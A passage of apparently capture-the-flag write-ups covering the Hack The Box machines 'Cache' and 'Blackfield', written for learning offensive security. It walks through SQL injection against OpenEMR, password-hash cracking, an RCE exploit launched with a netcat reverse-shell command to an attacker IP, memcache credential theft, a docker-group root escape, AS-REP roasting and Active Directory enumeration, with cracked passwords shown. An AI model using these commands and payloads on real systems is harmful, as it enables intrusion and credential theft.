a link to this on the main page.Fuzzing vhostsI missed this part at first because they didn’t use $VHOST.cache.htb but instead had used $VHOST.htb.snowscan@kali:~$ ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 902 -H \"Host: FUZZ.htb\" -u http://cache.htb        /'___\\  /'___\\           /'___\\              /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/              \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\              \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/               \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                 \\/_/    \\/_/   \\/___/    \\/_/              v1.1.0-git________________________________________________ :: Method           : GET :: URL              : http://cache.htb :: Wordlist         : FUZZ: /home/snowscan/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt :: Header           : Host: FUZZ.htb :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403 :: Filter           : Response words: 902________________________________________________hms                     [Status: 302, Size: 0, Words: 1, Lines: 1]HMS websiteWe found the HMS website hms.htb but we don’t have the credentials to log in.Let’s dirbust the site to see if we can find anything interesting.snowscan@kali:~$ gobuster dir -w tools/SecLists/Discovery/Web-Content/big.txt -u http://hms.htb===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:            http://hms.htb[+] Threads:        10[+] Wordlist:       tools/SecLists/Discovery/Web-Content/big.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster/3.0.1[+] Timeout:        10s===============================================================2020/05/09 19:17:40 Starting gobuster===============================================================/.htaccess (Status: 403)/.htpasswd (Status: 403)/LICENSE (Status: 200)/ci (Status: 301)/cloud (Status: 301)/common (Status: 301)/config (Status: 301)/contrib (Status: 301)/controllers (Status: 301)/custom (Status: 301)/entities (Status: 301)/images (Status: 301)/interface (Status: 301)/javascript (Status: 301)/library (Status: 301)/modules (Status: 301)/myportal (Status: 301)/patients (Status: 301)/portal (Status: 301)/public (Status: 301)/repositories (Status: 301)/server-status (Status: 403)/services (Status: 301)/sites (Status: 301)/sql (Status: 301)/templates (Status: 301)/tests (Status: 301)/vendor (Status: 301)===============================================================2020/05/09 19:18:13 Finished===============================================================The /sql directory contains a bunch of upgrade files, so based on the names we can guess we’re currently running verison 5.0.1Retrieving the username and password from the SQL databaseAfter doing some research we find a vulnerability report that contains many SQL injection vulnerabilities:https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdfThere’s an information disclosure vulnerability where we can find the database name and version of the application.  Version: 5.0.1(3)  DB name: openemrFirst, we’ll bypass the authentication page by visiting the registration page then browsing to another page like add_edit_event_user.php.I’ll grab the cookie values so I can use them with sqlmap.We can do the SQL injection manually like the following and extract information like the database server version.GET /portal/find_appt_popup_user.php?catid=1'+AND+(SELECT+0+FROM(SELECT+COUNT(*),CONCAT(%40%40VERSION,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+-[...]Duplicate entry '5.7.30-0ubuntu0.18.04.11' for key '&amp;lt;group_key&amp;gt;'But instead we’ll use sqlmap to speed up the exploitation of this box. We can see here that sqlmap has identified the injection point for the vulnerability and it is error-based so it should be quick to dump the contents of the database.snowscan@kali:~/htb/cache$ sqlmap -u \"http://hms.htb/portal/find_appt_popup_user.php?catid=*\" --cookie=\"OpenEMR=vp4f9asgbv507vpt84cioecmbg; PHPSESSID=cs1o3vot21n4odtira0s19iqu1\" --technique E --dbms=mysql        ___       __H__ ___ ___[']_____ ___ ___  {1.4.4#stable}|_ -| . [.]     | .'| . ||___|_  [(]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 09:32:35 /2020-05-10/custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] [09:32:37] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly[09:32:37] [INFO] testing connection to the target URL[09:32:37] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')[09:32:37] [INFO] testing for SQL injection on URI parameter '#1*'for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [09:32:40] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'[09:32:40] [WARNING] reflective value(s) found and filtering out[09:32:43] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'[09:32:46] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'[09:32:49] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'[09:32:52] [INFO] testing 'MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'[09:32:55] [INFO] testing 'MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'[09:32:58] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'[09:33:01] [INFO] URI parameter '#1*' is 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 346 HTTP(s) requests:---Parameter: #1* (URI)    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: http://hms.htb:80/portal/find_appt_popup_user.php?catid='||(SELECT 0x426c764c WHERE 3030=3030 AND (SELECT 8964 FROM(SELECT COUNT(*),CONCAT(0x7176786a71,(SELECT (ELT(8964=8964,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'---[09:33:16] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0[09:33:17] [INFO] fetched data logged to text files under '/home/snowscan/.sqlmap/output/hms.htb'[*] ending @ 09:33:17 /2020-05-10/We’ll dump the users_secure table containg the password hash.snowscan@kali:~/htb/cache$ sqlmap -u \"http://hms.htb/portal/find_appt_popup_user.php?catid=*\" --cookie=\"OpenEMR=vp4f9asgbv507vpt84cioecmbg; PHPSESSID=cs1o3vot21n4odtira0s19iqu1\" --technique E --dbms=mysql -D openemr -T users_secure --dump        ___       __H__                                                                                                        ___ ___[)]_____ ___ ___  {1.4.4#stable}                                                                           |_ -| . [']     | .'| . |                                                                                          |___|_  [,]_|_|_|__,|  _|                                                                                                |_|V...       |_|   http://sqlmap.org                                                                        [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 09:34:49 /2020-05-10/custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] [09:34:49] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly[09:34:49] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: #1* (URI)    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: http://hms.htb:80/portal/find_appt_popup_user.php?catid='||(SELECT 0x426c764c WHERE 3030=3030 AND (SELECT 8964 FROM(SELECT COUNT(*),CONCAT(0x7176786a71,(SELECT (ELT(8964=8964,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'                                                                       ---[09:34:49] [INFO] testing MySQL[09:34:49] [INFO] confirming MySQL[09:34:50] [WARNING] reflective value(s) found and filtering out[09:34:50] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0.0[09:34:50] [INFO] fetching columns for table 'users_secure' in database 'openemr'[09:34:50] [INFO] retrieved: 'id'[09:34:50] [INFO] retrieved: 'bigint(20)'[09:34:50] [INFO] retrieved: 'username'[09:34:50] [INFO] retrieved: 'varchar(255)'[09:34:50] [INFO] retrieved: 'password'[09:34:50] [INFO] retrieved: 'varchar(255)'[09:34:50] [INFO] retrieved: 'salt'[09:34:50] [INFO] retrieved: 'varchar(255)'[09:34:50] [INFO] retrieved: 'last_update'[09:34:50] [INFO] retrieved: 'timestamp'[09:34:50] [INFO] retrieved: 'password_history1'[09:34:50] [INFO] retrieved: 'varchar(255)'[09:34:50] [INFO] retrieved: 'salt_history1'[09:34:50] [INFO] retrieved: 'varchar(255)'[09:34:50] [INFO] retrieved: 'password_history2'[09:34:50] [INFO] retrieved: 'varchar(255)'[09:34:50] [INFO] retrieved: 'salt_history2'[09:34:50] [INFO] retrieved: 'varchar(255)'[09:34:50] [INFO] fetching entries for table 'users_secure' in database 'openemr'[09:34:50] [INFO] retrieved: '1'[09:34:51] [INFO] retrieved: '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.'[09:34:51] [INFO] retrieved: '2019-11-21 06:38:40'[09:34:51] [INFO] retrieved: ' '[09:34:51] [INFO] retrieved: ' '[09:34:51] [INFO] retrieved: '$2a$05$l2sTLIG6GTBeyBf7TAKL6A$'[09:34:51] [INFO] retrieved: ' '[09:34:51] [INFO] retrieved: ' '[09:34:51] [INFO] retrieved: 'openemr_admin'Database: openemrTable: users_secure[1 entry]+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+| id   | salt                           | username      | password                                                     | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+| 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+[09:34:51] [INFO] table 'openemr.users_secure' dumped to CSV file '/home/snowscan/.sqlmap/output/hms.htb/dump/openemr/users_secure.csv'                                                                                               [09:34:51] [INFO] fetched data logged to text files under '/home/snowscan/.sqlmap/output/hms.htb'[*] ending @ 09:34:51 /2020-05-10/Then with John we can crack that hash and get the password: xxxxxxsnowscan@kali:~/htb/cache$ john -w=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 32 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusxxxxxx           (?)1g 0:00:00:00 DONE (2020-05-10 09:41) 7.692g/s 6646p/s 6646c/s 6646C/s tristan..felipeUse the \"--show\" option to display all of the cracked passwords reliablySession completedOpenEMR remote code executionChecking searchsploit, I see a RCE exploit for our version.OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution[...]searchsploit -x 45161# Title: OpenEMR &lt; 5.0.1 - Remote Code Execution# Author: Cody Zacharias# Date: 2018-08-07# Vendor Homepage: https://www.open-emr.org/# Software Link: https://github.com/openemr/openemr/archive/v5_0_1_3.tar.gz# Dockerfile: https://github.com/haccer/exploits/blob/master/OpenEMR-RCE/Dockerfile # Version: &lt; 5.0.1 (Patch 4)# Tested on: Ubuntu LAMP, OpenEMR Version 5.0.1.3# References:# https://www.youtube.com/watch?v=DJSQ8Pk_7hc[...]Launching exploit and getting that first shell:snowscan@kali:~/htb/cache$ python exploit.py http://hms.htb/ -u openemr_admin -p xxxxxx -c 'rm /tmp/s;mkfifo /tmp/s;cat /tmp/s|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 4444 &gt;/tmp/s' .---.  ,---.  ,---.  .-. .-.,---.          ,---.    / .-. ) | .-.\\ | .-'  |  \\| || .-'  |\\    /|| .-.\\   | | |(_)| |-' )| `-.  |   | || `-.  |(\\  / || `-'/   | | | | | |--' | .-'  | |\\  || .-'  (_)\\/  ||   (    \\ `-' / | |    |  `--.| | |)||  `--.| \\  / || |\\ \\    )---'  /(     /( __.'/(  (_)/( __.'| |\\/| ||_| \\)\\  (_)    (__)   (__)   (__)   (__)    '-'  '-'    (__)                                                           ={   P R O J E C T    I N S E C U R I T Y   }=                                                                    Twitter : @Insecurity                                Site    : insecurity.sh                     [$] Authenticating with openemr_admin:xxxxxx[$] Injecting payloadsnowscan@kali:~/htb/cache$ rlwrap nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.10] from (UNKNOWN) [10.10.10.188] 34032/bin/sh: 0: can't access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@cache:/var/www/hms.htb/public_html/interface/main$From there we can su to user ash and use the same password we found earlier on the javascript code for the useless login page.www-data@cache:/var/www/hms.htb/public_html/interface/main$ su -l ashsu -l ashPassword: H@v3_funash@cache:~$ cdcdash@cache:~$ cat user.txtcat user.txtd415c4620a9ea235eac89874e513dcb0ash@cache:~$Pivot to user luffyThe /etc/passwd file contains another user luffy but I see there’s also a memcache user.ash@cache:~$ tail -n 10 /etc/passwdtail -n 10 /etc/passwdlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologinash:x:1000:1000:ash:/home/ash:/bin/bashluffy:x:1001:1001:,,,:/home/luffy:/bin/bashmemcache:x:111:114:Memcached,,,:/nonexistent:/bin/falsemysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/falseYup, memcache is running on there.ash@cache:~$ netstat -panut | grep 11211netstat -panut | grep 11211(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:11211         127.0.0.1:38902         ESTABLISHED -                   tcp        0      0 127.0.0.1:11211         127.0.0.1:38888         TIME_WAIT   -                   tcp        0      0 127.0.0.1:38902         127.0.0.1:11211         ESTABLISHED -Memcache doesn’t require authentication so we can pull information from the cache just by connecting and sending commands on port 11211. Here we’ll get information about the slabs.ash@cache:~$ telnet 127.0.0.1 11211telnet 127.0.0.1 11211Trying 127.0.0.1...Connected to 127.0.0.1.Escape character is '^]'.stats slabsstats slabsSTAT 1:chunk_size 96STAT 1:chunks_per_page 10922STAT 1:total_pages 1STAT 1:total_chunks 10922STAT 1:used_chunks 5STAT 1:free_chunks 10917STAT 1:free_chunks_end 0STAT 1:mem_requested 371STAT 1:get_hits 0STAT 1:cmd_set 1070STAT 1:delete_hits 0STAT 1:incr_hits 0STAT 1:decr_hits 0STAT 1:cas_hits 0STAT 1:cas_badval 0STAT 1:touch_hits 0STAT active_slabs 1STAT total_malloced 1048576ENDWhat’s really useful for us is the information about the keys. With the stats cachedump command we can see the keys currently stored.stats cachedump 1 0ITEM link [21 b; 0 s]ITEM user [5 b; 0 s]ITEM passwd [9 b; 0 s]ITEM file [7 b; 0 s]ITEM account [9 b; 0 s]ENDThen with the get command and the key name, we find some credentials in the cached values: luffy / 0n3_p1ec3get linkVALUE link 0 21https://hackthebox.euENDget userVALUE user 0 5luffyENDget passwdVALUE passwd 0 90n3_p1ec3ENDget fileVALUE file 0 7nothingENDget accountVALUE account 0 9afhj556uoENDI can see as luffy now:snowscan@kali:~/htb/cache$ ssh luffy@10.10.10.188luffy@10.10.10.188's password: Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-99-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sun May 10 13:53:17 UTC 2020  System load:  0.13              Processes:              196  Usage of /:   74.5% of 8.06GB   Users logged in:        1  Memory usage: 21%               IP address for ens160:  10.10.10.188  Swap usage:   0%                IP address for docker0: 172.17.0.1 * Canonical Livepatch is available for installation.   - Reduce system reboots and improve kernel security. Activate at:     https://ubuntu.com/livepatch107 packages can be updated.0 updates are security updates.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sun May 10 13:49:37 2020 from 10.10.14.52luffy@cache:~$PrivescLuffy is a member of the docker group so he can start new containers.luffy@cache:~$ iduid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)There’s already a ubuntu image on the box so I don’t even to upload my own.luffy@cache:~$ docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEubuntu              latest              2ca708c1c9cc        7 months ago        64.2MBI can launch the container and mount the root filesystem inside of /mnt/pwn and read the root.txt flag.luffy@cache:~$ docker run -v /:/mnt/pwn -ti ubunturoot@6c8efcc60a41:/# cd /mnt/pwn/rootroot@6c8efcc60a41:/mnt/pwn/root# lsroot.txtroot@6c8efcc60a41:/mnt/pwn/root# cat root.txt61673a57f540ad2350f46e78e6c4b8a1To log in as root I can just null out the root password with the following:root@697e85ba9d8a:/mnt/pwn/etc# sed -i s/root:.*:18178:0:99999:7:::/root::18178:0:99999:7:::/ shadowroot@f8e7727da260:/mnt/pwn/etc/pam.d# sed -i s/nullok_secure/nullok/ common-authluffy@cache:~$ suroot@cache:/home/luffy# iduid=0(root) gid=0(root) groups=0(root)root@cache:/home/luffy# cat /root/root.txt61673a57f540ad2350f46e78e6c4b8a1"
  },
  
  {
    "title": "Blackfield - Hack The Box",
    "url": "/posts/htb-writeup-blackfield/",
    "categories": "hackthebox, infosec",
    "tags": "ad, backup operators, asrep, lsass, pypykatz, usodllloader, impacket, bloodhound",
    "date": "2020-10-03 00:00:00 +0800",
    





    
    "snippet": "Blackfield was a fun Windows box where we get a list of potential usernames from an open SMB share, validate that list using kerbrute, then find and crack the hash of an account with the AS-REProas...",
    "content": "Blackfield was a fun Windows box where we get a list of potential usernames from an open SMB share, validate that list using kerbrute, then find and crack the hash of an account with the AS-REProasting technique. After getting that first user, we’ll use Bloodhound to discover that we can change another account’s password, then from there access a previously locked down SMB share, retrieve an LSASS dump file and get more credentials. For the last part of the box we’ll abuse the Backup Operators role to download a copy of the NTDS.dit file and recover the administrator NT hash.PortscanWe’ll start this box like any other machine, by scanning the open ports to identify the operating system and services running. We’re pretty confident that this box is is configured as a domain controller because port 88 for Kerberos is listening, as well as LDAP on port 389. The service running on port 88 is responsible for authenticating users on the domain and issuing Kerberos tickets.snowscan@kali:~/htb/blackfield_demo$ sudo nmap -sC -sV -p- -T4 10.10.10.192Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 21:39 EDTNmap scan report for 10.10.10.192Host is up (0.038s latency).Not shown: 65527 filtered portsPORT     STATE SERVICE       VERSION53/tcp   open  domain?| fingerprint-strings: |   DNSVersionBindReqTCP: |     version|_    bind88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-01 08:44:13Z)135/tcp  open  msrpc         Microsoft Windows RPC389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.03268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundSMB enumerationCrackmapexec is a post-exploitation tool that helps automate some tasks such as password spraying, enumerating shares, validating local admin access, executing commands on target machines, and much more. The nice thing is by default it will identify the operating system, hostname, domain name, SMB version and if SMB signing is enabled.Here, we see that the operating system is Windows Server 2019, based on the Build 17763 ID and some googling:snowscan@kali:~$ crackmapexec smb 10.10.10.192SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)There’s a nice tool called smbmap that we can use to enumerate SMB shares on a target machine. By default if you run it without specifying any username it will attempt to connect with a NULL session and we don’t get anything back because this is normally not enabled by default on modern versions of Windows Server.snowscan@kali:~$ smbmap -H 10.10.10.192[+] IP: 10.10.10.192:445\tName: 10.10.10.192However if you give it an invalid username, without specifying the password it will connect to the machine using a guest session. In this case, the guest session has access to list the shares on the machine.snowscan@kali:~$ smbmap -u invalid -H 10.10.10.192[+] Guest session   \tIP: 10.10.10.192:445\tName: 10.10.10.192                                              Disk                                                  \tPermissions\tComment----                                                  \t-----------\t-------\tADMIN$                                            \tNO ACCESS\tRemote Admin\tC$                                                \tNO ACCESS\tDefault share\tforensic                                          \tNO ACCESS\tForensic / Audit share.\tIPC$                                              \tREAD ONLY\tRemote IPC\tNETLOGON                                          \tNO ACCESS\tLogon server share \tprofiles$                                         \tREAD ONLY\t\tSYSVOL                                            \tNO ACCESS\tLogon server shareWe see two non-default shares on the machine: profiles$ and forensic, the later being inaccessible for the moment from our guest session. To check the files in the profiles$ share we could use smbmap but I’ll show the smbclient tool here. Again, we can specify an invalid username (if you don’t specify anything with smbclient, it’ll use your current Linux username). The share contains a bunch of directories for what seems to be a list of users on the domain controller.snowscan@kali:~$ smbclient -U invalid //10.10.10.192/profiles\\$Enter WORKGROUP\\invalid's password: Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Wed Jun  3 12:47:12 2020  ..                                  D        0  Wed Jun  3 12:47:12 2020  AAlleni                             D        0  Wed Jun  3 12:47:11 2020  ABarteski                           D        0  Wed Jun  3 12:47:11 2020  ABekesz                             D        0  Wed Jun  3 12:47:11 2020  ABenzies                            D        0  Wed Jun  3 12:47:11 2020  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020  AChampken                           D        0  Wed Jun  3 12:47:11 2020  ACheretei                           D        0  Wed Jun  3 12:47:11 2020  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020  [...]To save that long list of users to a file we can pipe the smbclient output to awk and select only the first string from the output.snowscan@kali:~/htb/blackfield_demo$ smbclient -U invalid%invalid //10.10.10.192/profiles\\$ -c ls | awk '{print $1}' &gt; users.txtsnowscan@kali:~/htb/blackfield_demo$ head users.txt...AAlleniABarteskiABekeszABenziesABiemillerAChampkenAChereteiACsonakiChecking for valid users on the machineNow that we have a list of potential usernames, we need to check if each of them is actually a real user account on the system. The fastest way to do this when we have access to the domain controller over port 88 is to use a tool like kerbrute.  To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts. This generates a Windows event ID 4768 if Kerberos logging is enabled.It takes a few minutes to run and we eventually get the confirmation about two valid accounts present on the system:  audit2020  svc_support  supportsnowscan@kali:~/htb/blackfield_demo$ kerbrute userenum --dc 10.10.10.192 -d blackfield users.txt    __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        Version: dev (n/a) - 08/31/20 - Ronnie Flathers @ropnop2020/08/31 19:28:55 &gt;  Using KDC(s):2020/08/31 19:28:55 &gt;  \t10.10.10.192:882020/08/31 19:29:16 &gt;  [+] VALID USERNAME:\t audit2020@blackfield2020/08/31 19:31:13 &gt;  [+] VALID USERNAME:\t svc_backup@blackfield2020/08/31 19:31:13 &gt;  [+] VALID USERNAME:\t support@blackfieldCracking hashes with AS-REP roastingNow that we have some account names, we’ll try to get some passwords or hashes. A few typical ways we could do this would be to run Responder if we’re on the same network segment as the users connecting to the machine, or we could also use the Kerberoast technique to get an encrypted hash from an account with a Service Principal name and crack it offline.The technique we’ll use here instead is AS-REP roasting and it exploits a non-default misconfiguration of user accounts. In a nutshell, if you disable pre-authentication on an account, you can crack the hash offline just like you would do using Kerberoast.  The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH). That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.The impacket suite has a script that performs this attack. Since our Kali VM isn’t configured to resolve the domain using the target machine DNS we need to provide the IP address of the DC and the list of valid users. The output here shows that the support account has Pre-Authentication disabled and we can retrieve the asrep hash.snowscan@kali:~/htb/blackfield_demo$ impacket-GetNPUsers blackfield/ -no-pass -dc-ip 10.10.10.192 -usersfile valid_users.txt Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$support@BLACKFIELD:3bbf5b20456f9539e6b59d29278fe01b$d0e38c74a27a2e1d46b2269b85111a158cc2aec48252ad4478eaf949a6311bef44eeca0373174bcaf0b7dfc7dee6d61dc51d1c5388f6f39d40b4bb0c1c1e39c489346007abd3cecf6ae6fc70a40742652358cfe687bd9f86b55de7b44b5e7cb07be8f62b5a95e750d8b8fd591005e778a7f34b7307b1abd7c19cf178e4e6e10bcac8ce418fdb0a56cfb42d06ff2b20ddc6c6e53faef8f3d4ae0c21d34ecc29dc351cb29269065dd97d11187d4ae5426dabdc314b9d1bca6b3bdeb20bdc7659af64211187d47e551d2dac89c5cb1fcbea1be9159ec912cf7fc0d8494f2c51c6ab0007f41c1a24fc11134408750395John The Ripper, a popular password cracking tool, already supports this hash type and providing the standard rockyou.txt wordlist we’re able to crack this very quickly. The password is: #00^BlackKnightsnowscan@kali:~/htb/blackfield_demo$ john -w=/usr/share/wordlists/rockyou.txt asrep.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD)Identify attack path from support to audit2020Using crackmapexec, we can confirm that the credentials are valid and look for additional shares that may be available. Here we see that the password for user support is valid but we don’t have any additional access.snowscan@kali:~/htb/blackfield_demo$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight' --sharesSMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\\support:#00^BlackKnight SMB         10.10.10.192    445    DC01             [+] Enumerated sharesSMB         10.10.10.192    445    DC01             Share           Permissions     RemarkSMB         10.10.10.192    445    DC01             -----           -----------     ------SMB         10.10.10.192    445    DC01             ADMIN$                          Remote AdminSMB         10.10.10.192    445    DC01             C$                              Default shareSMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPCSMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share SMB         10.10.10.192    445    DC01             profiles$       READ            SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server shareTo look for attack paths in Active Directory we’ll use Bloodhound, an Electron based tool that uses a neo4j database fed by a data collector to reveal hidden or unintended relationships between objects. The ingestor that comes with Bloodhound is written in C# and runs on Windows but there is also a Python-based ingestor that we’ll use instead. The ingestor will connect to Active Directory with the account credentials and download the list of computers, users, groups and access-lists then save it to a bunch of JSON files.snowscan@kali:~/htb/blackfield_demo$ python3 ~/tools/BloodHound.py/bloodhound.py -c all -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192INFO: Found AD domain: blackfield.localINFO: Connecting to LDAP server: dc01.blackfield.localINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 18 computersINFO: Connecting to LDAP server: dc01.blackfield.localINFO: Found 315 usersINFO: Connecting to GC LDAP server: dc01.blackfield.localINFO: Found 51 groupsINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: DC01.BLACKFIELD.localINFO: Done in 00M 06Ssnowscan@kali:~/htb/blackfield_demo$ ls -l *.json-rw-r--r-- 1 snowscan snowscan   2973 Aug 31 19:53 computers.json-rw-r--r-- 1 snowscan snowscan   2765 Aug 31 19:53 domains.json-rw-r--r-- 1 snowscan snowscan  80718 Aug 31 19:53 groups.json-rw-r--r-- 1 snowscan snowscan 665454 Aug 31 19:53 users.jsonTo load the data in Bloodhound, we first need to start the neo4j database with sudo neo4j console. When you first set it up, you’ll need to connect to port 7474 with your browser and change the default password. Once the database is setup we’ll launch Bloodhound and connect with the credentials, then click Upload Data and upload all the JSON files. Once this is done we should see the database populated like the following:Bloodhound comes with a bunch of pre-defined queries that can help spot easy attack paths. Here, we’ll do a search for the support user then click on it to reveal the properties.If we scroll down and select Outbound Object Control we can see that the Support user has the privileges to change the password for the Audit2020 user. This will allow us to take over the Audit2020 account.Password reset for user Audit2020We’ll use the net program to force the password change of 